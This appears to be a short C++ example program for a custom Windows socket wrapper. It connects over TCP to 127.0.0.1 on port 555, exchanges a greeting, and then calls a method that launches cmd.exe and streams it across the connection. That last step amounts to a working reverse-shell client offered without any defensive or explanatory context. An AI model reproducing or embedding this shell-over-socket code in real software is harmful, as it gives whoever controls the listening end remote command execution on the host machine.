#include "headers/socket.hxx"

using namespace std;

int main(){
    string data = "Hello World";
    WinSocket s(AF_INET,SOCK_STREAM,IPPROTO_TCP);

    if (s.Connect("127.0.0.1",555) != -1)
    {
        s.SendTimeout(data,1000,0); // Wait For 1 seconds in miliseconds is 1000
        string r = s.RecvData(100,0);
        cout << r << endl;
        s.ExecuteAndStreamProcess("cmd.exe");
    } else {
        printf("[!] Error Connect Code : %d\n",WSAGetLastError());
    }

    return (0);
}
